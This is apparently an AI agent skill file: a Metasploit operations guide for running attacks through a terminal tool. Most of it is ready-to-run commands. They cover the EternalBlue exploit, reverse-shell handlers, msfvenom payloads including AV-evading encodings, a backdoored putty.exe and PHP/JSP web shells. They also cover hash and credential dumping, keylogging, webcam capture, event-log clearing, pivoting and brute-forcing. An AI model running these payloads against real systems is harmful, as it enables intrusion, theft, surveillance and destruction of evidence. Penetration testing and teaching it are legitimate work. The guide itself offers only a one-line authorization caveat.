---
name: metasploit-usage
description: Covers msfconsole, msfvenom, exploits, payloads, sessions, and post-exploitation per official docs.
version: 0.1.0
author: Hermes
platforms: [linux, macos]
metadata:
  hermes:
    tags:
      - Metasploit
      - Exploitation
      - Pentesting
      - Framework
---

# Metasploit Framework Usage

Comprehensive Metasploit reference covering msfconsole, msfvenom, modules, payloads, sessions, Meterpreter, and post-exploitation. Based on the official Rapid7 documentation at docs.metasploit.com/docs/pentesting/. Does NOT cover module development (see separate skill).

## When to Use

- Coordinating a penetration test with Metasploit
- Need exact msfconsole commands for a specific exploit or service
- Generating payloads with msfvenom
- Managing post-exploitation sessions, pivoting, or gathering
- Setting up reverse/bind shells with Metasploit handlers
- Upgrading shells to Meterpreter
- Service-specific pentesting (SMB, SSH, HTTP, MSSQL, LDAP, etc.)

## Prerequisites

- Metasploit Framework installed (`msfconsole` available)
  - Kali: pre-installed
  - Ubuntu/Debian: `curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall`
- `msfvenom` (bundled with Metasploit)
- Database: `msfdb init` (for persistent workspace support)
- Target authorization — only exploit systems you own or have explicit permission to test

## How to Run

Launch msfconsole via the `terminal` tool. For long operations, use `terminal(background=true)`.

```bash
msfconsole          # Start interactive console
msfconsole -q       # Quiet mode (no banner)
msfconsole -r script.rc  # Run resource script
```

## Quick Reference

### Module Types

| Type | Prefix | Purpose |
|------|--------|---------|
| `exploit` | `exploit/` | Leverages vulnerabilities for code execution |
| `auxiliary` | `auxiliary/` | Scanning, fuzzing, DoS, data gathering |
| `post` | `post/` | Post-exploitation data collection |
| `payload` | `payload/` | Code delivered to target (shells, Meterpreter) |
| `encoder` | `encoder/` | Obfuscates payloads to evade detection |
| `nop` | `nop/` | NOP sled generator |
| `evasion` | `evasion/` | Bypass AV/EDR |

### msfconsole Core Commands

| Command | Description |
|---------|-------------|
| `search <term>` | Find modules by name, type, CVE, platform |
| `use <module>` | Select a module |
| `show options` / `options` | Display module options |
| `show advanced` | Show advanced options (timeouts, evasion) |
| `show payloads` | List compatible payloads |
| `show targets` | List target OS/versions |
| `set <OPT> <val>` | Set a module option |
| `setg <OPT> <val>` | Set globally |
| `unset <OPT>` | Clear an option |
| `gset` / `gunset` | Get/set global datastore |
| `run` / `exploit` | Execute module |
| `check` | Verify target vulnerability |
| `back` | Return from module |
| `info <module>` | Module details and references |
| `sessions` | List active sessions |
| `sessions -i <id>` | Interact with session |
| `sessions -u <id>` | Upgrade shell to Meterpreter |
| `sessions -k <id>` | Kill session |
| `jobs` | List background jobs |
| `route` | Pivot routes |
| `resource <file>` | Run batch commands |
| `db_nmap <args>` | Run nmap, store in database |
| `hosts` / `services` / `creds` / `loot` | Query database |
| `workspace` | Manage workspaces |
| `irb` | Interactive Ruby shell |
| `exit` | Quit msfconsole |

## Procedure

### 1. Starting & Finding Modules

```bash
msfconsole -q

# Search by type and keyword
search type:exploit smb
search cve:2017-0144
search platform:windows type:auxiliary scanner

# Search by service/port
search smb_login
search ssh_version

# View module info
info exploit/windows/smb/ms17_010_eternalblue
```

### 2. Running an Exploit (Basic Flow)

```bash
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > options
msf6 exploit(...) > set RHOSTS 192.168.1.10
msf6 exploit(...) > set LHOST 192.168.1.5
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > show payloads
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > check      # Verify vulnerability first
msf6 exploit(...) > exploit    # or `run -j` to background
```

### 3. Managing Sessions

```bash
msf6 > sessions -l          # List all

# Interact with session
msf6 > sessions -i 1
meterpreter > help

# Upgrade shell to Meterpreter
msf6 > sessions -u -1       # Most recent session
msf6 > sessions -u 3        # Specific session ID

# Background a session
meterpreter > background
# Or: Ctrl+Z

# Kill session
msf6 > sessions -k 1
```

### 4. Reverse Shell Handler (multi/handler)

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set ExitOnSession false   # Keep listening
msf6 exploit(multi/handler) > exploit -j                # Run as job
```

### 5. msfvenom Payload Generation

```bash
# List payloads
msfvenom -l payloads

# List formats
msfvenom --list formats

# List encoders
msfvenom -l encoders

# Basic reverse TCP Meterpreter (Windows EXE)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o payload.exe

# Reverse TCP (Linux ELF)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o payload.elf

# Encoded payload (shikata_ga_nai, avoid bad chars)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -b '\x00\x0a\x0d' -f exe -o payload.exe

# Embed in existing executable (-k preserves behavior as new thread)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -x putty.exe -k -f exe -o putty_backdoor.exe

# RAW output for shellcode
msfvenom -p windows/x64/exec CMD=calc.exe -f raw

# Python / C / PowerShell formats
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f python
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f c
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f psh-reflection -o payload.ps1

# Web payloads (ASP, JSP, PHP, WAR)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.jsp
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.php
```

### 6. Meterpreter Essentials

```bash
meterpreter > sysinfo           # OS info
meterpreter > getuid            # Current user
meterpreter > getprivs          # Privileges
meterpreter > getsystem         # Elevate to SYSTEM (Windows)
meterpreter > hashdump          # Dump password hashes
meterpreter > ps                # Process list
meterpreter > migrate <PID>     # Move to another process
meterpreter > shell             # Drop to system shell
meterpreter > upload /local/file C:\\remote\\path
meterpreter > download C:\\remote\\file /local/path
meterpreter > execute -f cmd.exe -i -H  # Interactive, hidden
meterpreter > clearev           # Clear event logs
meterpreter > webcam_list / webcam_snap  # Webcam
meterpreter > screenshot        # Screenshot
meterpreter > keyscan_start / keyscan_dump / keyscan_stop
meterpreter > portfwd add -l 3389 -p 3389 -r target
meterpreter > run post/windows/gather/hashdump
meterpreter > run post/windows/gather/enum_logged_on_users
```

### 7. Service-Specific Attacks

**SMB (Windows File Sharing)**
```bash
use auxiliary/scanner/smb/smb_version       # Detect SMB version
use auxiliary/scanner/smb/smb_enumshares     # List shares
use auxiliary/scanner/smb/smb_login          # Brute-force
use auxiliary/scanner/smb/pipe_auditor       # Named pipes
use exploit/windows/smb/ms17_010_eternalblue # EternalBlue
```

**SSH**
```bash
use auxiliary/scanner/ssh/ssh_version        # Detect version
use auxiliary/scanner/ssh/ssh_login          # Brute-force
use auxiliary/scanner/ssh/ssh_enumusers      # Enumerate users
use exploit/multi/ssh/sshexec                # Execute via SSH creds
```

**HTTP/HTTPS**
```bash
use auxiliary/scanner/http/http_version       # Detect web servers
use auxiliary/scanner/http/dir_scanner        # Directory scanning
use auxiliary/scanner/http/http_login         # Brute-force HTTP basic/NTLM
use auxiliary/scanner/http/files_dir          # Common files check
use auxiliary/scanner/http/title              # Page titles
use auxiliary/scanner/http/ssl                # SSL info
use auxiliary/scanner/http/cisco_directory_traversal
use auxiliary/scanner/http/tomcat_mgr_login   # Tomcat login
```

**MSSQL**
```bash
use auxiliary/scanner/mssql/mssql_ping        # Discover MSSQL
use auxiliary/scanner/mssql/mssql_login       # Brute-force
use auxiliary/admin/mssql/mssql_exec          # Execute commands
use auxiliary/admin/mssql/mssql_enum          # Enumeration
```

**MySQL / PostgreSQL**
```bash
use auxiliary/scanner/mysql/mysql_version      # Version
use auxiliary/scanner/mysql/mysql_login        # Login brute-force
use auxiliary/scanner/mysql/mysql_hashdump     # Hash dump
use auxiliary/scanner/postgres/postgres_version
use auxiliary/scanner/postgres/postgres_login
```

**WinRM / LDAP**
```bash
use auxiliary/scanner/winrm/winrm_login
use auxiliary/scanner/winrm/winrm_cmd
use auxiliary/gather/ldap_query
use auxiliary/gather/ldap_hashdump
```

**Kubernetes**
```bash
use auxiliary/scanner/kubernetes/kubernetes_version
use auxiliary/scanner/http/kubelet_api
use auxiliary/scanner/http/kubelet_unauth
```

### 8. Post-Exploitation Modules

```bash
# Gather modules (run inside Meterpreter session)
meterpreter > run post/windows/gather/hashdump
meterpreter > run post/windows/gather/enum_shares
meterpreter > run post/windows/gather/enum_domain
meterpreter > run post/windows/gather/credentials/credential_collector
meterpreter > run post/linux/gather/hashdump
meterpreter > run post/multi/gather/env                 # Environment vars
meterpreter > run post/multi/gather/find_vm             # Detect VM
meterpreter > run post/multi/manage/shell_to_meterpreter # Upgrade
```

### 9. Database & Workspace Management

```bash
# Initialize database
msfdb init

# In msfconsole
msf6 > workspace -a MyProject      # Create workspace
msf6 > workspace MyProject          # Switch
msf6 > workspace -d MyProject       # Delete

# Store nmap results
msf6 > db_nmap -sV -p- 192.168.1.0/24

# Query
msf6 > hosts                         # Discovered hosts
msf6 > services                      # Discovered services
msf6 > creds                         # Stored credentials
msf6 > loot                          # Collected files
msf6 > hosts -R                      # Set RHOSTS from hosts
msf6 > services -p 445 -R            # Set RHOSTS for SMB
```

### 10. Pivoting & Routing

```bash
# Add route through compromised host
msf6 > route add 10.10.10.0/24 1   # Route subnet through session 1
msf6 > route print
msf6 > route remove 10.10.10.0/24 1

# Autoroute (auto-discover subnets)
meterpreter > run post/multi/manage/autoroute

# SOCKS proxy through session
meterpreter > run auxiliary/server/socks_proxy SRVHOST=127.0.0.1 SRVPORT=1080
# Then use proxychains with 127.0.0.1:1080

# Port forwarding
meterpreter > portfwd add -L 0.0.0.0 -l 3389 -p 3389 -r 10.10.10.5
meterpreter > portfwd list
meterpreter > portfwd delete -l 3389
```

## Pitfalls

- **LHOST must be reachable**: reverse connections need the target to route to your LHOST. Use `LHOST 0.0.0.0` for handler on all interfaces.
- **Firewalls**: SMB/445 often blocked on external targets; use `reverse_http` or `reverse_https` payloads.
- **Encoders don't evade AV anymore**: most AVs detect common encoders (shikata_ga_nai). Use `evasion` modules or external packing.
- **`getsystem` not guaranteed**: needs SeDebugPrivilege or a local exploit.
- **Meterpreter stages**: staged payloads are smaller but need network access for the second stage. Use `meterpreter_reverse_tcp` (stageless with `_` not `/`) if staging is unreliable.
- **Database**: `msfdb` uses PostgreSQL. If `msfdb init` fails, check that PG is running.
- **Large scans**: `db_nmap` with `-p-` can take hours. Always background with `-j` or use `terminal(background=true)`.
- **`ExitOnSession`**: if not set to `false`, multi/handler exits after first shell; loses remaining callbacks.

## Verification

```bash
# msfvenom generates a payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /dev/null
# Should output: "Payload size: XX bytes"

# msfconsole launches
msfconsole -q -c "version; exit"
# Should show Metasploit version
```